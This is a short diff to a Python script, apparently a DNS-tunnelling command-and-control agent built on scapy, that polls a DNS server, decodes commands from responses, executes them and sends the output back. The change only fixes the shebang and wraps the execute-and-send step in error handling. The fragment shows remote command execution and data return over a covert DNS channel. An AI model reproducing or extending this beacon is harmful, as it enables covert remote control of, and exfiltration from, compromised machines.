@@ -1,5 +1,4 @@
-#! /usr/bin/env python3
-
+#!/usr/bin/env python3
 from scapy.all import DNS, DNSQR, IP, UDP, sr, sr1
 from base64 import b64encode, b64decode
 from random import randint
@@ -45,8 +44,11 @@ def pulse() -> None:
 
             if res[DNS].z == 1:
                 cmd = decode(recv)
-                print(cmd.decode())
-                send_data(execute(cmd))
+                try:
+                    print(cmd.decode())
+                    send_data(execute(cmd))
+                except:
+                    print("Data got corrupted!")
                 recv = b""
 
         sleep(PULSE)
